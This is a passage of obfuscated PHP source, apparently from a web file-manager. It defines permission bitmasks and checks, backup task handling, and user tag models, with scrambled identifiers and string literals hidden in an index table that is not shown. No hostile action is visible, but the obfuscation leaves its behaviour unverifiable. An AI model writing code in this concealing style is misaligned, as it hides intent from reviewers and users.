$Áˆ‰şÇÀ[$Ä˜•õ’—[411]] = 2; $‰—Ââü‡ = Model($Ä˜•õ’—[829])->where($Áˆ‰şÇÀ)->sum($Ä˜•õ’—[76]); return array($Ä˜•õ’—[767] => $–¿Ó›Ğã[$Ä˜•õ’—[76]], $Ä˜•õ’—[1797] => $–¿Ó›Ğã[$Ä˜•õ’—[1797]], $Ä˜•õ’—[1798] => (int) $ï«åà”Ì, $Ä˜•õ’—[1799] => (int) $‰—Ââü‡); } private function sourceSize() { $Şéû¥Èø =& $_SERVER[óó‹¸‚å]; $¾Şì«†ô = Model($Şéû¥Èø[829])->where(array($Şéû¥Èø[410] => 0))->sum($Şéû¥Èø[76]); $±²É¶— = Model($Şéû¥Èø[471])->sum($Şéû¥Èø[76]); if ($±²É¶— > $¾Şì«†ô) { $±²É¶— = $¾Şì«†ô; } return array($Şéû¥Èø[76] => (int) $¾Şì«†ô, $Şéû¥Èø[1797] => (int) $±²É¶—); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $ø¡´¸Ê§ =& $_SERVER[óó‹¸‚å]; $Œ¯ï×ßÈ = array(array($ø¡´¸Ê§[420] => LNG($ø¡´¸Ê§[1864]), $ø¡´¸Ê§[1865] => $ø¡´¸Ê§[1866], $ø¡´¸Ê§[1867] => 1, $ø¡´¸Ê§[1868] => 1, $ø¡´¸Ê§[1869] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($ø¡´¸Ê§[420] => LNG($ø¡´¸Ê§[1870]), $ø¡´¸Ê§[1865] => $ø¡´¸Ê§[1871], $ø¡´¸Ê§[1867] => 2, $ø¡´¸Ê§[1868] => 1, $ø¡´¸Ê§[1869] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($ø¡´¸Ê§[420] => LNG($ø¡´¸Ê§[1872]), $ø¡´¸Ê§[1865] => $ø¡´¸Ê§[1873], $ø¡´¸Ê§[1867] => 3, $ø¡´¸Ê§[1868] => 1, $ø¡´¸Ê§[1869] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($ø¡´¸Ê§[420] => LNG($ø¡´¸Ê§[1874]), $ø¡´¸Ê§[1865] => $ø¡´¸Ê§[1875], $ø¡´¸Ê§[1867] => 4, $ø¡´¸Ê§[1868] => 1, $ø¡´¸Ê§[1869] => self::AUTH_SHOW | self::AUTH_VIEW), array($ø¡´¸Ê§[420] => LNG($ø¡´¸Ê§[1876]), $ø¡´¸Ê§[1865] => $ø¡´¸Ê§[1877], $ø¡´¸Ê§[1867] => 5, $ø¡´¸Ê§[1868] => 1, $ø¡´¸Ê§[1869] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($ø¡´¸Ê§[420] => LNG($ø¡´¸Ê§[1878]), $ø¡´¸Ê§[1865] => $ø¡´¸Ê§[1879], $ø¡´¸Ê§[1867] => 6, $ø¡´¸Ê§[1868] => 1, $ø¡´¸Ê§[1869] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($ø¡´¸Ê§[420] => LNG($ø¡´¸Ê§[1880]), $ø¡´¸Ê§[1865] => $ø¡´¸Ê§[1881], $ø¡´¸Ê§[1867] => 7, $ø¡´¸Ê§[1868] => 1, $ø¡´¸Ê§[1869] => 0)); return $Œ¯ï×ßÈ; } public static function authCheck($Ï§ÉÌ·°, $ª­Ùéªî) { $Ÿ¶ãÍêù =& $_SERVER[óó‹¸‚å]; $Ï§ÉÌ·° = intval($Ï§ÉÌ·°); if ($GLOBALS[$Ÿ¶ãÍêù[503]] && $GLOBALS[$Ÿ¶ãÍêù[6]][$Ÿ¶ãÍêù[1882]]) { return !0; } if ($Ï§ÉÌ·° <= 0) { return !1; } if (($Ï§ÉÌ·° & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Ï§ÉÌ·° & $ª­Ùéªî); } public static function authCheckShow($„ÀÏ»ÖÉ) { return self::authCheck($„ÀÏ»ÖÉ, self::AUTH_SHOW); } public static function authCheckView($î¯»õÒ) { return self::authCheck($î¯»õÒ, self::AUTH_VIEW); } public static function authCheckDownload($£úãÄ•‰) { return self::authCheck($£úãÄ•‰, self::AUTH_DOWNLOAD); } public static function authCheckUpload($Î•ó•êõ) { return self::authCheck($Î•ó•êõ, self::AUTH_UPLOAD); } public static function authCheckEdit($­šÀ®Â) { return self::authCheck($­šÀ®Â, self::AUTH_EDIT); } public static function authCheckRemove($õÄ¬úÈ¾) { return self::authCheck($õÄ¬úÈ¾, self::AUTH_REMOVE); } public static function authCheckShare($Ò×Œ³Úø) { return self::authCheck($Ò×Œ³Úø, self::AUTH_SHARE); } public static function authCheckComment($ˆ³‰àÌ€) { return self::authCheck($ˆ³‰àÌ€, self::AUTH_COMMENT); } public static function authCheckEvent($Õ‹™»—¤) { return self::authCheck($Õ‹™»—¤, self::AUTH_EVENT); } public static function authCheckRoot($¡›Ùìû) { return self::authCheck($¡›Ùìû, self::AUTH_ROOT); } public static function authCheckAction($•ï£²ê, $®—€»¨¶) { $÷ƒ×·¨€ =& $_SERVER[óó‹¸‚å]; $Úúƒ»¦‰ = array($÷ƒ×·¨€[1883] => self::AUTH_VIEW, $÷ƒ×·¨€[1202] => self::AUTH_DOWNLOAD, $÷ƒ×·¨€[107] => self::AUTH_UPLOAD, $÷ƒ×·¨€[1833] => self::AUTH_EDIT, $÷ƒ×·¨€[1832] => self::AUTH_REMOVE, $÷ƒ×·¨€[1843] => self::AUTH_SHARE, $÷ƒ×·¨€[354] => self::AUTH_COMMENT, $÷ƒ×·¨€[1662] => self::AUTH_EVENT, $÷ƒ×·¨€[1884] => self::AUTH_ROOT); if (!isset($Úúƒ»¦‰[$®—€»¨¶])) { return; } $éë««ş = $Úúƒ»¦‰[$®—€»¨¶]; $•ï£²ê = intval($•ï£²ê); if ($•ï£²ê <= 0) { return !1; } if (($•ï£²ê & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($•ï£²ê & $éë««ş); } public static function authDisable($åéçüİ, $ĞÒ£™½Ş) { if (intval($åéçüİ) <= 0) { return 0; } return intval($åéçüİ) & ~$ĞÒ£™½Ş; } public $optionType = "\x53\171\163\x74\145\155\56\x73\x6f\x75\x72\x63\x65\x41\x75\164\x68\114\x69\163\x74"; public $field = array("\156\141\155\145", "\x61\x75\164\x68", "\154\x61\x62\x65\154", "\x64\151\163\160\154\141\171", "\163\x79\x73\164\145\x6d", "\x73\157\x72\164"); public function initData() { $øğäÓ¯Ù = $this->authDefault(); foreach ($øğäÓ¯Ù as $åÕ±«Üİ) { $this->add($åÕ±«Üİ); } } public function findAuth($°·Şâû’, $¡ÏşéëÄ) { $¾åç¿ë =& $_SERVER[óó‹¸‚å]; $…àùóŠÅ = parent::listData(); foreach ($…àùóŠÅ as $Á¨˜Ş) { $çù–Ìƒ¿ = intval($Á¨˜Ş[$¾åç¿ë[413]]); if ($çù–Ìƒ¿ <= 0 || $Á¨˜Ş[$¾åç¿ë[1885]] == 0) { continue; } if (($çù–Ìƒ¿ & $°·Şâû’) != $°·Şâû’) { continue; } if (($çù–Ìƒ¿ & $¡ÏşéëÄ) != 0) { continue; } return $Á¨˜Ş[$¾åç¿ë[399]]; } return !1; } public function findAuthReadOnly() { $¨ÓÒ—ÁÉ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $ØÇ£ôœç = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($¨ÓÒ—ÁÉ, $ØÇ£ôœç); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $«İåÑ’î =& $_SERVER[óó‹¸‚å]; $¼à°—Öç = parent::listData(); $øêàİ¯‹ = !1; foreach ($¼à°—Öç as $·ÜÌ¦¯ç) { if ($·ÜÌ¦¯ç[$«İåÑ’î[413]] <= 0 || $·ÜÌ¦¯ç[$«İåÑ’î[1885]] == $«İåÑ’î[197]) { continue; } if (!$øêàİ¯‹) { $øêàİ¯‹ = $·ÜÌ¦¯ç; continue; } if ($øêàİ¯‹[$«İåÑ’î[413]] > $·ÜÌ¦¯ç[$«İåÑ’î[413]]) { $øêàİ¯‹ = $·ÜÌ¦¯ç; } } return $øêàİ¯‹ ? $øêàİ¯‹[$«İåÑ’î[399]] : $«İåÑ’î[12]; } public function listData($ç¹®“å” = false, $Ñ÷½Üøç = "\163\157\x72\164", $ÈÅŒòËç = false) { return parent::listData($ç¹®“å”, $Ñ÷½Üøç, $ÈÅŒòËç); } public function update($šÉä—ïœ, $ÙÔ£») { $Ô ÛÏÉÀ =& $_SERVER[óó‹¸‚å]; $Òéß”å• = parent::listData($šÉä—ïœ); $Ì–×˜¡‹ = $this->findByName($ÙÔ£»[$Ô ÛÏÉÀ[32]]); if (!$Òéß”å• || $Ì–×˜¡‹ && $Ì–×˜¡‹[$Ô ÛÏÉÀ[399]] != $Òéß”å•[$Ô ÛÏÉÀ[399]]) { return !1; } $this->filterAuth($ÙÔ£»[$Ô ÛÏÉÀ[413]]); return parent::update($šÉä—ïœ, $ÙÔ£»); } public function remove($“ƒ¡ª‹Ê) { $¤ËÇ‰‰Â = parent::listData($“ƒ¡ª‹Ê); if (!$¤ËÇ‰‰Â || $¤ËÇ‰‰Â[$_SERVER[óó‹¸‚å][1292]]) { return !1; } return parent::remove($“ƒ¡ª‹Ê); } public function add($şúû• = array()) { $†ß›àŸŒ =& $_SERVER[óó‹¸‚å]; if ($this->findByName($şúû•[$†ß›àŸŒ[32]])) { return !1; } $¿ñÇéœ‹ = array($†ß›àŸŒ[32] => $†ß›àŸŒ[12], $†ß›àŸŒ[413] => 1, $†ß›àŸŒ[1886] => $†ß›àŸŒ[1873], $†ß›àŸŒ[1885] => 1, $†ß›àŸŒ[1292] => 0, $†ß›àŸŒ[1887] => 0); $şúû• = array_merge($¿ñÇéœ‹, $şúû•); $şúû•[$†ß›àŸŒ[1887]] = $this->getSort(); $this->filterAuth($şúû•[$†ß›àŸŒ[413]]); return parent::insert($şúû•); } private function getSort() { $Ÿ´é¤£ =& $_SERVER[óó‹¸‚å]; $÷ñã…ˆ = parent::listData(); $¯ªÃÔ… = array_to_keyvalue($÷ñã…ˆ, $Ÿ´é¤£[12], $Ÿ´é¤£[1887]); return empty($¯ªÃÔ…) ? 0 : max($¯ªÃÔ…) + 1; } private function filterAuth(&$ÍÌ¦¼ Â) { if (!$ÍÌ¦¼ Â) { return; } $÷õ¶£µ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $éœÛÛ½™ = array(); foreach ($÷õ¶£µ as $½ã¤Â°) { if ($ÍÌ¦¼ Â & $½ã¤Â°) { $éœÛÛ½™[] = $½ã¤Â°; } } if (in_array(self::AUTH_ROOT, $éœÛÛ½™)) { $ÍÌ¦¼ Â = array_sum($÷õ¶£µ); return; } $€ Šˆ®Ş = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($éœÛÛ½™ as $½ã¤Â°) { if (isset($€ Šˆ®Ş[$½ã¤Â°])) { $éœÛÛ½™ = array_merge($éœÛÛ½™, $€ Šˆ®Ş[$½ã¤Â°]); } } $éœÛÛ½™[] = self::AUTH_SHOW; $ÍÌ¦¼ Â = array_sum(array_unique($éœÛÛ½™)); } public function sort($²”Şé‹Œ, $Òñš•è) { return parent::update($²”Şé‹Œ, $Òñš•è); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\x6d\x2e\142\141\x63\x6b\x75\160\x4c\x69\x73\x74"; public $field = array("\x69\x6f", "\x6e\x61\x6d\145", "\x73\x74\x61\x74\x75\163", "\x63\157\x6e\x74\x65\x6e\x74", "\x6d\141\x6e\165\x61\x6c", "\x72\x65\x73\x75\154\x74", "\164\x69\155\145\106\162\157\155", "\x74\x69\155\145\x54\x6f"); public function config() { $´½¯ˆ‡Ü =& $_SERVER[óó‹¸‚å]; $ªç‰Ïâ’ = Model($´½¯ˆ‡Ü[774])->get($´½¯ˆ‡Ü[784]); $ªç‰Ïâ’ = json_decode($ªç‰Ïâ’, !0); $ªç‰Ïâ’ = is_array($ªç‰Ïâ’) ? $ªç‰Ïâ’ : array(); if (!isset($ªç‰Ïâ’[$´½¯ˆ‡Ü[759]])) { $ªç‰Ïâ’[$´½¯ˆ‡Ü[759]] = $´½¯ˆ‡Ü[88]; } unset($ªç‰Ïâ’[$´½¯ˆ‡Ü[1644]]); Action($´½¯ˆ‡Ü[1888])->taskInit(); Model($´½¯ˆ‡Ü[1643])->cacheClear(); $öí¨„É¤ = $´½¯ˆ‡Ü[1889]; $ª¹âïÍÖ = Model($´½¯ˆ‡Ü[1890])->findByKey($´½¯ˆ‡Ü[1662], $öí¨„É¤); if (!$ª¹âïÍÖ) { $ª¹âïÍÖ = array(); } if (isset($ª¹âïÍÖ[$´½¯ˆ‡Ü[203]])) { $ª¹âïÍÖ[$´½¯ˆ‡Ü[203]] = json_decode($ª¹âïÍÖ[$´½¯ˆ‡Ü[203]], !0); } if (isset($ªç‰Ïâ’[$´½¯ˆ‡Ü[203]])) { $ª¹âïÍÖ[$´½¯ˆ‡Ü[203]][$´½¯ˆ‡Ü[1647]] = $ªç‰Ïâ’[$´½¯ˆ‡Ü[203]]; unset($ªç‰Ïâ’[$´½¯ˆ‡Ü[203]]); } return array_merge($ª¹âïÍÖ, $ªç‰Ïâ’); } public function listData($õÅÎÂ = false, $ØÔ¡ÏÒ = "\155\157\x64\151\x66\x79\124\x69\x6d\x65", $Û©ºÙ… = false) { return parent::listData($õÅÎÂ, $ØÔ¡ÏÒ, !0); } public function lastItem() { $Ùèà½æ = $this->listData(); return !empty($Ùèà½æ[0]) ? $Ùèà½æ[0] : null; } public function kill($•šÅö®£) { $„éœñ¯ú =& $_SERVER[óó‹¸‚å]; $Êú¨„µš = $this->listData($•šÅö®£); if (!$Êú¨„µš || empty($Êú¨„µš[$„éœñ¯ú[32]])) { return !0; } Task::kill($„éœñ¯ú[783]); Task::kill($„éœñ¯ú[804]); Task::kill($„éœñ¯ú[813]); $Ã‰¨Ÿ°¼ = $Êú¨„µš[$„éœñ¯ú[32]]; $ÌÔôÎÏÇ = TEMP_FILES . $„éœñ¯ú[782] . $Ã‰¨Ÿ°¼ . $„éœñ¯ú[8]; IO::remove($ÌÔôÎÏÇ, !1); return $this->remove($•šÅö®£); } public function remove($İÍ¿ë·º) { $È–ƒìûó = $this->listData($İÍ¿ë·º); if (!$È–ƒìûó) { return !0; } return $this->backupRemove($È–ƒìûó); } private function backupRemove($Â“×§Ë¨) { parent::remove($Â“×§Ë¨[$_SERVER[óó‹¸‚å][399]]); $Ìª— • = $this->backupPath($Â“×§Ë¨); IO::remove($Ìª— •, !1); return !0; } private function backupPath($ô²ˆ”ßè) { $»Ò¤ÚİÁ =& $_SERVER[óó‹¸‚å]; $ÕâƒÊàå = $ô²ˆ”ßè[$»Ò¤ÚİÁ[32]]; $Ğ·®Õ©­ = Model($»Ò¤ÚİÁ[774])->get($»Ò¤ÚİÁ[775]); $ÑÛíø¶Ï = substr(md5($»Ò¤ÚİÁ[776] . $Ğ·®Õ©­ . $ÕâƒÊàå), 0, 8); return "\x7b\151\157\x3a{$ô²ˆ”ßè[$»Ò¤ÚİÁ[756]]}\x7d\57\144\141\164\x61\x62\141\x73\145\57\x62\x61\143\153\x75\160\x2f" . $ÕâƒÊàå . $»Ò¤ÚİÁ[11] . $ÑÛíø¶Ï; } public function start() { $¶Å¡âîù =& $_SERVER[óó‹¸‚å]; if ($GLOBALS[$¶Å¡âîù[6]][$¶Å¡âîù[89]][$¶Å¡âîù[1891]] != $¶Å¡âîù[88]) { return !0; } $Ü¢Æ´±ò = $this->config(); if (!$Ü¢Æ´±ò || $Ü¢Æ´±ò[$¶Å¡âîù[1644]] != $¶Å¡âîù[88]) { return !1; } $“Ùçïë÷ = $this->process(); foreach ($“Ùçïë÷ as $»‚Áá”˜) { if ($»‚Áá”˜) { return Task::restart($»‚Áá”˜[$¶Å¡âîù[399]]); } } $É©µ¶ÌŠ = new Backup(); $“èíë£Á = $É©µ¶ÌŠ->db(); if ($“èíë£Á) { $“èíë£Á = $É©µ¶ÌŠ->dbFile(); if ($“èíë£Á && $Ü¢Æ´±ò[$¶Å¡âîù[759]] == $¶Å¡âîù[197]) { $“èíë£Á = $É©µ¶ÌŠ->file(); } } Backup::set(array($¶Å¡âîù[754] => 1, $¶Å¡âîù[497] => time())); return !0; } public function process() { $•²©ˆ­ö =& $_SERVER[óó‹¸‚å]; $Ë—Óˆä° = array($•²©ˆ­ö[762] => Task::get($•²©ˆ­ö[783]), $•²©ˆ­ö[766] => Task::get($•²©ˆ­ö[804]), $•²©ˆ­ö[199] => Task::get($•²©ˆ­ö[813])); $¾ä… áÏ = !1; foreach ($Ë—Óˆä° as &$½÷¼Äáš) { if ($¾ä… áÏ) { $½÷¼Äáš = !1; continue; } if ($½÷¼Äáš) { $Ñ´¨Ëì = intval(_get($½÷¼Äáš, $•²©ˆ­ö[1679], 0)); if (time() - $Ñ´¨Ëì > 7200) { Task::kill($½÷¼Äáš[$•²©ˆ­ö[399]]); $¾ä… áÏ = !0; $½÷¼Äáš = !1; } } } return $Ë—Óˆä°; } public function restore() { $Û¨ƒÔåÑ =& $_SERVER[óó‹¸‚å]; ActionCall($Û¨ƒÔåÑ[1067], !0, 1); ActionCall($Û¨ƒÔåÑ[1067], !0, 0); } } goto CÜ¨¬¾Ô†“; F„Şó§ñš’: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\145\162\x5f\x66\141\x76"; protected function cacheFunctionAlias($ØÃ¬”Î‹) { $ÉßÊöÉ³ =& $_SERVER[óó‹¸‚å]; return array($ÉßÊöÉ³[1974] => array($ÉßÊöÉ³[2354] . USER_ID, $ÉßÊöÉ³[1975])); } protected function listData() { $ÅŠ”ê†Ÿ =& $_SERVER[óó‹¸‚å]; $ºŒÖİëĞ = array($ÅŠ”ê†Ÿ[1665] => USER_ID, $ÅŠ”ê†Ÿ[484] => array($ÅŠ”ê†Ÿ[1978], 0)); $Æ¤ ß¤ = $ÅŠ”ê†Ÿ[2355]; $éíí¡€€ = $this->field($Æ¤ ß¤)->where($ºŒÖİëĞ)->order($ÅŠ”ê†Ÿ[1981])->select(); return $éíí¡€€ ? $éíí¡€€ : array(); } protected function addToTag($»ä™‡, $êàî¾ßõ) { $ıİÎŞÊ =& $_SERVER[óó‹¸‚å]; if (!Model($ıİÎŞÊ[2118])->listData($êàî¾ßõ)) { return !1; } if (is_numeric($»ä™‡)) { $ş€‘÷ğ = Model($ıİÎŞÊ[829])->pathInfo($»ä™‡); if (!$ş€‘÷ğ) { return !1; } } else { $ş€‘÷ğ = IO::infoSimple($»ä™‡); if (!$ş€‘÷ğ) { return !1; } $‰İİÚáä = $ş€‘÷ğ[$ıİÎŞÊ[32]]; $µÜµ = $ş€‘÷ğ[$ıİÎŞÊ[33]]; if (isset($ş€‘÷ğ[$ıİÎŞÊ[410]])) { $µÜµ = $ş€‘÷ğ[$ıİÎŞÊ[410]] == $ıİÎŞÊ[88] ? $ıİÎŞÊ[75] : $ıİÎŞÊ[199]; } } $èù‘—¢¿ = array($ıİÎŞÊ[1665] => USER_ID, $ıİÎŞÊ[484] => $êàî¾ßõ, $ıİÎŞÊ[421] => $»ä™‡, $ıİÎŞÊ[422] => $µÜµ ? $µÜµ : $ıİÎŞÊ[416], $ıİÎŞÊ[420] => $‰İİÚáä ? $‰İİÚáä : $ıİÎŞÊ[12], $ıİÎŞÊ[1867] => 0); if ($this->where($èù‘—¢¿)->find()) { return !1; } return $this->add($èù‘—¢¿); } protected function removeFromTag($±° ¥š, $æ£ğ§Å¬) { $ô›Ñûö¨ =& $_SERVER[óó‹¸‚å]; if (!Model($ô›Ñûö¨[2118])->listData($æ£ğ§Å¬)) { return !1; } if (is_array($±° ¥š)) { $±° ¥š = array($ô›Ñûö¨[7], $±° ¥š); } $³·¼Õ‰ö = array($ô›Ñûö¨[1665] => USER_ID, $ô›Ñûö¨[484] => $æ£ğ§Å¬, $ô›Ñûö¨[421] => $±° ¥š); return $this->where($³·¼Õ‰ö)->delete(); } protected function removeByTag($ÅÈÉÎíˆ) { $®èé½ÅŠ =& $_SERVER[óó‹¸‚å]; if (!$ÅÈÉÎíˆ) { return !1; } $ÛôÂï¥¶ = array($®èé½ÅŠ[1665] => USER_ID, $®èé½ÅŠ[484] => $ÅÈÉÎíˆ); return $this->where($ÛôÂï¥¶)->delete(); } protected function removeBySource($Ú‰¡˜¿™) { $Ö¢šáÉ =& $_SERVER[óó‹¸‚å]; if (is_array($Ú‰¡˜¿™)) { $Ú‰¡˜¿™ = array($Ö¢šáÉ[7], $Ú‰¡˜¿™); } $òú‹›µ = array($Ö¢šáÉ[1665] => USER_ID, $Ö¢šáÉ[484] => array($Ö¢šáÉ[1021], 0), $Ö¢šáÉ[421] => $Ú‰¡˜¿™); return $this->where($òú‹›µ)->delete(); } }